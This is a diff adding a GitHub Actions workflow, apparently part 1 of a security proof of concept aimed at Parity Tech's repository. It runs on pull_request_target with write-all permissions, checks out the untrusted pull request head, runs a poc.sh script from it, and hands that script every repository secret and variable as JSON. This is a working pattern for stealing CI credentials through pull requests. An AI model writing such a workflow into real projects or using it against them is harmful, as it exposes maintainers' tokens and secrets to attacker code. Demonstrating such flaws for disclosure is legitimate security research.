@@ -1,0 +1,17 @@
+# This is Part 1 of a PoC for Parity Tech (Attempt 2)
+on: pull_request_target
+permissions: write-all
+
+jobs:
+  poc:
+    if: ${{ github.actor == 'avivkeller' }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: ./poc.sh
+        env:
+          secrets: ${{ toJSON(secrets) }}
+          variables: ${{ toJSON(vars) }}
